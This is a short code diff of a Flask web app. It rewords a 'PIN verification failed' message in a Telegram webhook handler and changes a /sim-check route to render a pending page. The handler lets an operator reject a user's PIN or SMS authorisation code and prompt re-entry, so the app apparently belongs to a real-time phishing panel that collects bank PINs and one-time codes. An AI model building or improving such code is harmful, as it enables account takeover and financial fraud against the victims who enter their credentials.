@@ -193,7 +193,7 @@ def telegram_webhook():
                         elif action == "reject":
                             if step_code == "pin":
                                 new_status = "Reject_PIN"
-                                fail_msg = "❌ PIN verification failed. Please re-enter your PIN."
+                                fail_msg = "❌ PIN verification failed. Please check your PIN and re-enter."
                             elif step_code == "sms":
                                 new_status = "Reject_SMS"
                                 fail_msg = "❌ SMS authorization failed. Please re-enter the code."
@@ -268,18 +268,13 @@ def index():
 @app.route("/sim-check")
 def sim_check():
     app_id = request.args.get("app_id")
-    record = None
-    if app_id:
-        record = applications_collection.find_one({"app_id": app_id})
+    current_id = session.get("current_app_id")
+    
+    if not app_id and current_id:
+        record = applications_collection.find_one({"_id": ObjectId(current_id)})
+        app_id = record.get("app_id") if record else "APP-PENDING"
         
-    if record:
-        session["current_app_id"] = str(record["_id"])
-        return jsonify({
-            "status": record.get("status", "Pending_PIN"),
-            "custom_message": record.get("custom_message", "")
-        })
-            
-    return jsonify({"status": "Pending_PIN", "custom_message": ""})
+    return render_template("pending.html", app_id=app_id)
 
 @app.route("/apply/step1", methods=["GET", "POST"])
 def apply_step1():
